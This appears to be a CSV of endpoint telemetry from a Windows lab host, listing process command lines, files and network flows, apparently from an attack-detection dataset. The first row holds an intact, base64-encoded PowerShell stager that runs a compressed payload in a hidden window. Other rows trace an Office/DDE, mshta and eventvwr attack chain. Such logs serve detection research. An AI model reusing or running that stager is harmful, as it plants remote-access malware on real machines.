1420584b563a51957e06247be0fb98dfc6cc59b8d73bc3396ae517275e6707af,{'subject': 'c:/windows/system32/windowspowershell/v1.0/powershell.exe C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnAH0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGkAcgArACcAXABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQA7ACQAcwA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAUwB0AGEAcgB0AEkAbgBmAG8AOwAkAHMALgBGAGkAbABlAE4AYQBtAGUAPQAkAGIAOwAkAHMALgBBAHIAZwB1AG0AZQBuAHQAcwA9ACcALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAJgAoAFsAcwBjAHIAaQBwAHQAYgBsAG8AYwBrAF0AOgA6AGMAcgBlAGEAdABlACgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAKAAoACcAJwBIADQAcwBJAEEARwBUADYAMQBtAEkAQwBBADcAVgBXAGIAVwAvAGEAUwBCAEQAKwBYAHEAbgAvAHcAYQBxAFEATQBDAHIAQgBOAGkARQBSAFIASwBwADAAewAwAH0AcgB5AG0AcwBYAG0AewAwAH0AcwBRAE0AVQBuAFQAYgAyAFkAagBhAHMAdgBjAFIAZQBRADAAaQB2AC8ALwAxAG0AQQBUAGUAcABrAHQAJwAnACsAJwAnADcAMQBUAHEAbwBsAHkAKwB2ACcAJwArACcAJwBkAG0AZABuAFoAWgA1ADYAWgAyAFcAVQBXACsANQB5AHcAVwBBAG8AZQBPAHQAZgBTADEALwBmAHYAcABOAE0AegBSAEEAbQBLAEoATABsAEEAawB5AEEATgB5AGwASgBoAGIAWABSAEsAegA2AHUARgBWAFYAWAA2AEoATQBsAHoAZgBiAE4AcABzAFEAaQBSAGUASABGADEAWgBXAFIASgBnAG0ATgArAC8ASwA5ADAATQBkAGYAVABGAEUAZAAzAGwATwBCAFUATABrAGwALwBTAGQANABLAEoALwBoAHMAYwBIAGUAUABmAFMANQA5AGwAUQBwAC8AVgByAHEAVQAzAFMARgA2AEUAdABzAGIAeQBGADkAaAA2AFUAeQBQACcAJwArACcAJwBBADcARgAyAHcAMwB3AGsASABLAHYAWQBHADAAcQA0AFgAUAB6AHkAcABWAGkAYQBuADIAbQBMAFMAdgBzAGgAUQB6AFMAVgBpAC8AWQArADUAVABpAHEAQgBKAFEAVwBTADkASwAzAGsAdABqAFEAMgBXACsAdwBYAEQAUwBKAG4ANwBDAFUATABYAG4ARgBJAC8ARgA1AHQAVABLAEoAVQA3AFQARQBGAGwAagBiAFkAaABQAHoARgBRAHYAUwBJAGgAegBsACsAVABBAEoANQBsAGsAUwBpAHoATQBKAEkAMABjAFIAdQBRAGoARABZAGMASgA4AFAAUQBnAFMAbgBLAGIARgBzAGoAUQBYADUAdQBlAEwAewAwAH0AUgAvAHkALwBMAFQAMwBPAEkAcwA1AGkAWABDAGwASAAzACcAJwArACcAJwBPAGMAcwBJADIATgBrAHkAMwB7ADAAfQBjAFYAcgBwAG8AVABpAGcAZQBJAHkAWABDADkAQwB5AGUAVQBMAGkAYwBGAEUAcQBnAGQAaQBXAHIAYgBGAGMAaQBEAE4ASwB5ADkASgAvAE0AUwBOAGIAZQBKAGMAagA5ADYAdABLADgAawBzAGwAawBCAHIAeQBwAEYAUwBHAGcATAA0ADYAcABjAG0AQwBqAE8ASwBqAFgAdgBFAE4ATgA0ADgAVQBLAE0ARgB6AG8AZwBHAEEAOQAwADMAZwB0ADgAeQA1AHcAJwAnACsAJwAnADgAZwBnAGYAWQBNADcAegB7ADAAfQBQADUATQB6ACsAcwBZAFAAQgBZAEgAcgBLAFUASABKAFEALwBTAFcAcABaAE0AbQBGADMAewAwAH0ARgBtAHkAaAA5ACsAQwBrADIAUwA0AHQAUABpAE8AdAAxAFQAWQB0AHMAcQAvAGEAawB2AEwARgBVAEUAdABHAHMARABFADMARwBVAGsAVwBEAHkAcgAvAHsAMAB9AEQANQBBAHIANgBJAGgATQB6AFAAYQBkAHoAQwBTAHsAMAB9AEwAagAxAGoANQBHAEUAZgBGAHoAcABzAHAAdgB7ADAAfQBRAE0AdgBLAFQANwBBAFUAYwBuAEYATABIAEIAUABMAHAANABXAGMATgBEAEMARgBJAGUASQBDADQAdwBGAEwAVgA2AHAAdABTAFAAQwB2ACsAcwAyAE0AMABJAEQAbgBPAGcAKwB7ADAAfQBEAFEARgByAHkARABjAHAAUgArAGQATwBZAFoATgBMAHYAWgBqAEUAMABlAEEAMwBQAEUAZgBlAEYAcABZAFEAbgA3AGcAWABQAHEAVQBFAC8AdAA4AGQALwBFAFAAUQBrAFcARABvAGoAUQB0AFMAOABNAE0ARQB0AFEAdgBTAHoAWgBHAEYARQBPAGUANgAzAEYASwBUAGsAdAA2AHsAMAB9AHQAbABoAFcASAB7ADAAfQAyADEAOAB3AG8ASgB6ADUASwBlAFcANQB1AFUAZgBvAFIAegBkAE8AdQBCAG8AdABUAG4AbQBRACsAaABCAFEAUQBjAE8AdwBOADkAZwBtAGkAQQBwAEMAeQAxAEMATQBCACcAJwArACcAJwBiAHUANQB0AEUAdQBhADcARgA5ACsARQB3ADAAQwBVAFEAdQBLAEEAcABTADIARQBBADIAWQBFAEQARABZAFgAUgBFAGwARQBRAGQAJwAnACsAJwAnAHEAMgBTAGgAVQBiADgAMwA2ADAAbwBUAGcAQwBpAFUATwAxADYARgBBAFUAUQBtADAANABKAGMAZQBCAFYAeQBqAEUAUQBmAEYAdABMAC8ATQBrAE8ARABKAGUAbwBKAEwARAA4AGMASgBIAEMATABWAE4ARwBTADkATABMAGsAawA0AGwAQgA2AEIAYwBEAFQANABIAHcANgA4AEwAagBqAEMARQB5AFAAQgBwADYAagBJAGUAVgA3AE4AbQAzAHMAdQBpAEYAOQBJAC8AZAAyAFQAbwBPAGMASgBuAEEATQBVAEMAUQBjAFkATwBnAG0ATABtAGkAagBGAGwANwBWAGoAZABaAEUALwBLAEEAJwAnACsAJwAnAE0AeQAxAE8ARwBaAHQAbgBvADIAdwBlADYAYQBhAFAAMABkAHYAQwBhADgARQAzAEwAZQBaACsAYQB5AFAAdQBRAHEAaQAwAHoAZgBTAEkAZgBkAFQAbAAwAG4AdQAzAEQAbgAxAHkAMwBkAEQANgA0AEQAMwBMAEQAZABHAHIAZgAnACcAKwAnACcAYgBmAFcANAAnACcAKwAnACcATQA5AGQANgBJAHEATQAzAGEAeQBtACsAJwAnACsAJwAnAHEAagBoAGgAcgBZAFQAagBSAGUAdwA1AFIAdwArAG4ASwBwACsAcQB3ADEAVgBQAHMAYQBhAHEAUwBYAGMAOABUAHQAbwA0ADIALwBGAHEAdABkADYAdgBxADUAKwBlADEAdwBiAG0ANgBCAHUAJwAnACsAJwAnAGkAbQBvAEwAZgBXAEEAeQBzAGkAdQA4AGMAYgBHAEUATQBaAEgAZAB3ADAAKwAyAGwAVAA3AGQAUAAyAHQAVABHACsAOAA2AHEAZABtAFUAZAA3AFMAcQAyAHoAVwBuAG8AcwB0AFMAKwBuAEwAVQBWAFIARwBnAEgAcQBYAHQAQgBBAGIANwBLAGcAUwBqAFAAawBqAHAAbgBUADgANgBPAG0AbwByAGgAbQB3AEoAMgBKAFoAagBtAFQAagB5AHQAYgBuAE4AUAB7ADAAfQBHAHAAZgBJAGUAMAB5AG4AZABsADIANwB1AGQAZgBEAHoAMgAxAHQATgBRACcAJwArACcAJwBXAGQAbwBOAHQANABRAHEAMAAwAHQATAAwAEwAZABlAGIAdABRAHMAZgByADMAUABmAGIARABhAGYAZgBDAFUAUABUADYAVwBmAG0AZgBSAHIANgA4AGYAUgB5ADQAUABpAFoAYQBhAHoARABjAGQAVwA5AFIAOQBYADYAMQByAHoAWABIADgAMgBXAGUATgB2AGgATwBLAEwANwBtAFQAZgBiAFkAcQBOACsAWQBlADEAcgBPADcAMABiAFgAcgBwAHsAMAB9AEYAQwBzAE4AMQA1AGwAVQBXAFEAdgA4AFkAQgAvADMANABNAFMAQQBhAE0ASwBYAEcAOAAwADEAUgB7ADAAfQBPAFQAegA3AHAAVABiAFYASQBOADIAbwA3AFcAcwBHADYAZgA2AEgANQBVAHIAZQAvAHUASgBtADEAdQByAFMAOABNAC8ANgBtADkAcwA5AHsAMAB9AFEATgBaADgAcwAxAHsAMAB9AG8AMQBSADYAaQBEAHIAKwBQADYAbgBhACcAJwArACcAJwBKAE4ANAArADYAawBHAHUAcABtAFIAdAByAGkAZgBLADUAbQBlACcAJwArACcAJwBXAGoAQQAzAFoAdgA3AHIAYQBMAE4AWgBnADgARwBiAGIAQwB3AFoAZQBwADYAUAB3ADUAUgBPAEIANgBoAFYAYwBOAEQAUABiAGMAYgBNADkAQgAxAEwAWQBHAEoAaAB3AHkAMQAyACsAJwAnACsAJwAnADIAQgAvAFAAUgBXAEQAOABaAGoAUgBwAG8AZwAzADEAMgAxADYANgAzAGIARQBIAHcAZQBCAHYANAA1AEcAKwAvAEEAMABlADUARwBSADcAbwArADAAZwBGAGYAZQBIAFcAOQBZAHoASAB2ADgAOQBpADUAVwBDAHIAdQAnACcAKwAnACcARwB2AFkAbQBPAEwAaQBGADkAUgBEAFcASABEAGMASwBnAGYAVQB7ADAAfQBVAFIAcABlAFoAOQBkAHoAaABtAFQAbgBOADMAYwAxAHMASQAvAGQANgBVADUAVABHAEkASgBvAEsAJwAnACsAJwAnAGQAWABHAFAAdQBoAGQAcQAxAFAANwBJAHAAdgAnACcAKwAnACcAZABqAHYAUgBNAE0AVABSAEcAWgB3ADkANgBaADYAaABvAG8AMAArAGYAUABnAEMAaAA1AHsAMAB9AE0AUwA4AC8AUABxAG8AcwBDAHMAdQBpAGoAMQA3ADkAOABWAE4AdQA0AEwAVAB2ACsAcwBqAFoAawBvAFMAVgBlAEkAQQB0AGUAaABRACsAWABGAHAAcwBPAFMAegBxAG4AbgBEAEIAawBSAEcAcgBKADgAdQBMAGUAcwBjAFIASgBqAEMAcgAwAGUAYgBnAE4ANQBuAHUAcQBVAE0AbAA5ADAAdgBFAE4AMwBnAG0ANQA3ADcASQBHAGkASgBVAC8ANgBCADUALwBlAEcAcABXAGsANwA0AEsAbAA1ADEANgBZAFQAMQAxAGQAegBjAEIATAB5AEgAMgBSAG0AWgBVAGIASABJAGQAOABWAFYAWQBmAHoAMQBVAFYAZQBwAGoANgBxAE4AWQBPAGEAZgA3AHIAWgB6AFAAWQBaAGkAOABmAGoASgBWAEYARgB3AFIAbwBjAHQAdgAwAFkAQgB2AE0AawBhACcAJwArACcAJwBVAGsAeQA3ADgAZgBMAGIAagBxAGMAQwBpADgAUAA4AGYAcgBaADkARABCADMAbQBzAG8AbABWAEMANABqAHoAVgBNAEEATgBoAGsAagBMADYARQA3ADMAQwB1ADcAMAB7ADAAfQA0AGkAUgAyAEEAcABzAEgAQgA1ACsASwBTAEkAeQBnAEMANgBtAGYANABRAFMAcAB3AGMAUQBWADQAZQBhAFUAbwA0AEcAMwA3ADkAOQBMAG0AVgBJAGgAWAA4AEEAbgArAGoAVABiAFAAYwAvACsAdwArAGsAdABVAFUAcwBzAEMAbgBGAGUAVABQADAANgA4ADYARgA2AC8ARQBRAEEAUABFAFEANgBTAE4AdgBRAFQAaQBvACsAWABtADcAZAB7ADAAfQBPAEcAWABLAGkALwBoAEMAYwBDAEEATgBsAHEAZABIAFgAUABZAEgAJwAnACsAJwAnAEcAVAArAHoANABBAEoANQBhAEcAbAAvAEEAMgBTAGUASwBZAEIAbABEAEEAQQBBACcAJwApAC0AZgAnACcAeAAnACcAKQApACkAKQAsAFsAUwB5AHMAdABlAG0ALgBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0AcAByAGUAcwBzACkAKQApAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApACkAKQAnADsAJABzAC4AVQBzAGUAUwBoAGUAbABsAEUAeABlAGMAdQB0AGUAPQAkAGYAYQBsAHMAZQA7ACQAcwAuAFIAZQBkAGkAcgBlAGMAdABTAHQAYQBuAGQAYQByAGQATwB1AHQAcAB1AHQAPQAkAHQAcgB1AGUAOwAkAHMALgBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAPQAnAEgAaQBkAGQAZQBuACcAOwAkAHMALgBDAHIAZQBhAHQAZQBOAG8AVwBpAG4AZABvAHcAPQAkAHQAcgB1AGUAOwAkAHAAPQBbAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzAC4AUAByAG8AYwBlAHMAcwBdADoAOgBTAHQAYQByAHQAKAAkAHMAKQA7AA=='},446902
2f8193c46e2c980c59deee0cdd9c8d5d0ad799dbf9f1e6701843519c71243707,{'subject': 'c:/windows/system32/lsm.exe C:/Windows/system32/lsm.exe'},446901
5459b4c614ca96f1da29d1c731ada6caaec4cc473ae884f440dd7b5e528c3fb2,{'netflow': '192.168.223.128:49305->34.107.221.82:80'},435133
a8b1ccb871e8dddc3c78ca523e88c5ec92fc4d30e8a76ad5a2237bb747824445,{'file': 'c:/windows/system32/dwm.exe'},124863
987d11e258ea33a0fb267b89320ed205c38449350827aa60238b0d7bfca661f5,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{F9717507-6651-4EDB-BFF7-AE615179BCCF}'},449472
d394060f952ae02bf77e5b83fd603bba4ec2bf0428486e87def493341b0c86b8,{'subject': 'c:/program files/vmware/vmware tools/tpautoconnect.exe TPAutoConnect.exe -q -i vmware -a COM1 -F 30'},448454
e4beff789cd4cf8547b9d5b12f122c07b9dfb236ff0ff6b65223e1097f435fb0,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{F9717507-6651-4EDB-BFF7-AE615179BCCF}'},449482
a5f0f2f1ec13281a563719a28542aa9d3d3f885b585156b86ed0a0b5a54880c6,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{F9717507-6651-4EDB-BFF7-AE615179BCCF}'},447435
85d853894dacabede2e28b3f6af300cd01555c314215be7520496154d4a08099,{'subject': 'c:/windows/system32/mmc.exe C:/Windows/system32/mmc.exe C:/Windows/system32/eventvwr.msc /s'},450511
46ad40a989090fe305aa97656f13205653997f94446b02ccb39a9a89db3e15b4,{'subject': 'c:/windows/system32/consent.exe consent.exe 976 378 02CAFAB8'},450512
7559417f0b8dce7d5aa1e5dbc681928b8a9592d7bacd4d1bb669e6b5d2c9cc52,{'netflow': '192.168.223.128:49263->10.193.66.115:8443'},447442
828dafaa7f61a8e4cacc65dec6266990060e6f1db47a223b1018644e22cd361b,{'subject': 'c:/program files/confer/repux.exe repux.exe'},447445
9723e4cc48ff3deb290fb8f26f21e677e1ad8509e33be2bd8159e7fc82340ffb,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}'},450518
fec12b3c5e63abafc7988e2fcc70e8c6264c60d0408a1b2e07198fd4b792e216,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}'},450519
a3b3ff3433f20ea2ed7e13b7325f1cf3f4987b4ea2abded3d60c58d384008200,{'subject': 'c:/program files/microsoft office/office14/winword.exe C:/Program Files/Microsoft Office/Office14/WINWORD.EXE '},446934
dec3611335a52368d927c0975205be12b3b61794f341990a74475a9f35c825c9,{'netflow': '192.168.223.128:49530->10.193.66.115:8080'},449497
17fee91ee5e120af659b43571ed9c963e6fe3a7c732b5c63b5b0cd84e43b868d,{'subject': 'c:/windows/system32/mshta.exe C:/Windows/System32/mshta.exe -Embedding'},447447
3f2d93f0f362e0d300d347d27afc937de381b5b0e7b6589d84abf5daf61ff3d7,{'subject': 'c:/windows/system32/wbem/wmiprvse.exe C:/Windows/system32/wbem/wmiprvse.exe'},448988
92e1fe0e5e452245a9edcb0a7962b61026395b65acb074fc12e8fbf8ded0a393,{'subject': 'c:/windows/system32/wbem/wmiapsrv.exe C:/Windows/system32/wbem/WmiApSrv.exe'},448989
6267bf0c62e30ccc929d8c75d5ad5eb7879a503536379eba87bf5b92beabc075,{'subject': 'c:/windows/explorer.exe C:/Windows/Explorer.EXE'},446944
6c1ae27d0df472028f8cae412d4e7eb050c06474101a90964a3fdcd794ed4ce5,{'subject': 'c:/windows/system32/lsm.exe C:/Windows/system32/lsm.exe'},448484
2c52956d52b45174f4a8f65baad82f36c903642370a8443e3d66d750406fec29,{'subject': 'c:/windows/system32/mmc.exe C:/Windows/system32/mmc.exe C:/Windows/system32/eventvwr.msc /s'},448488
dbe4b2fa7c6c693b3e089ef72a4e61ba468e3656f102c508f3313aa6bd0ccc73,{'subject': 'c:/windows/system32/cmd.exe C:/Windows/system32/cmd.exe /c C:/Users/aalsahee/Desktop/start_dns_logs.bat '},448491
2c8ddef9f0a57d7dcbf1caae8d6d082da466906d52e4374a86eda8a2a352441b,"{'subject': 'c:/windows/system32/csrss.exe %SystemRoot%/system32/csrss.exe ObjectDirectory=/Windows SharedSection=1024,12288,512 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'}",448492
3ae12d4bdb4aecca2351c46e3a148b7147a41376337ebe3dfabe86f6e14b7f3c,{'subject': 'c:/windows/system32/conhost.exe /??/C:/Windows/system32/conhost.exe -2050881272-1695825705-1922368619-188917070774647623913881295529187257621718413777'},448493
2f12ee1696dae7bcf9bb0e2bb2f95b60fa596ba88706b855e527c2cdff5c9934,{'subject': 'c:/program files/wireshark/tshark.exe C:/Program Files/Wireshark/tshark  -i 2 -t ad -f udp port 53 '},448494
9e691243a0ac5f60b8011ae3326572c9a9b4161281f0ea24484431f789eaea69,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}'},448495
b83098625e765b10b47175f7aa0ac6e3a7fbcc19b180491546de5e360c19f537,{'subject': 'c:/program files/wireshark/dumpcap.exe C:/Program Files/Wireshark/dumpcap.exe -D -Z none'},448496
0e27b602c3b8e86d7170f1e5da8d4e5eb7dd1c1b2bc9efe018644f73cbee8d4b,{'subject': 'c:/windows/system32/conhost.exe /??/C:/Windows/system32/conhost.exe -145205785-680505413-462666790387455757176834226210528146401356558200-1563980855'},448497
cd9a8d0ac8f702c0901e4279951995f716bc0bba92fac089a5ae25478f91a226,{'file': 'c:/windows/system32/msiexec.exe'},241651
3292987feae540a809e1d984c18d7afb2bdc5dd9431481b0de39896e4a08be0f,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/System32/svchost.exe -k WerSvcGroup'},447475
852cabb7ed93053e6ecb0f331d4b5b018bb5c464b69b8915ac0ef53d7c895b58,{'subject': 'c:/program files/wireshark/dumpcap.exe C:/Program Files/Wireshark/dumpcap.exe -D -Z none'},448500
5d6b357d70f0c1c5953a6dcb5747a33a8321ca44035d6497712471abb7774f3e,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/system32/svchost.exe -k LocalService'},447477
9fffe98c681c9e518724eea8cbf4035792ca81b32d44ba65eaa93ae93cf6a526,{'subject': 'c:/windows/system32/conhost.exe /??/C:/Windows/system32/conhost.exe 7875551821394768321542554144229138516-144537068-16793719541808367445-1492169726'},448503
2b188009167303c4f7327ff2f1183d885c9b159782ba37c0bd1c5371d7fb5a4c,{'subject': 'c:/program files/microsoft office/office14/excel.exe C:/Program Files/Microsoft Office/Office14/EXCEL.EXE /dde'},446966
915b5afe2dca48a274e71c0897232bef3d8912b34ac1ed1a52a72dbebd73bf37,{'subject': 'c:/program files/wireshark/dumpcap.exe C:/Program Files/Wireshark/dumpcap.exe -n -i /Device/NPF_{DE145F66-537B-427D-820A-707CC694DA57} -f udp port 53 -Z 3984'},448502
944920ee613c58bedd5dd384a05e339b07a4e79b44714923abb475efa3487841,{'subject': 'c:/windows/explorer.exe C:/Windows/Explorer.EXE'},447482
658cbee76c53aa33821a0a58ac9c396573d581aa6a28420a71d58c254d877089,{'subject': 'c:/windows/system32/services.exe C:/Windows/system32/services.exe'},447476
7a24e6a0e75ef8ac51eb9921581751b533025ea48a57bccd9f050c7e7add1c82,{'subject': 'c:/windows/system32/conhost.exe /??/C:/Windows/system32/conhost.exe 1675602792-99581110-2020548844-1026384817-113595231213763238641944049842-1500162840'},448501
4ea84d16d1a94bf5ad9c3dcec3c44ce72997632ae48fac960d429b2cc84da0d2,{'subject': 'c:/windows/system32/taskhost.exe taskhost.exe'},447478
8b90d330db942108a04c9b5a21f3f63d544b4035f577adc076213f8f9651db88,{'subject': 'c:/windows/system32/conhost.exe /??/C:/Windows/system32/conhost.exe -17964072601008519428-10934750291226217215-1196757724-1008424694628864262-1645672054'},450558
c043bb9dad8b0347deb5e4ad1e8b5c423e688a0473db10ac4eab3fd707a845f8,{'subject': 'c:/windows/system32/audiodg.exe C:/Windows/system32/AUDIODG.EXE 0x348'},449023
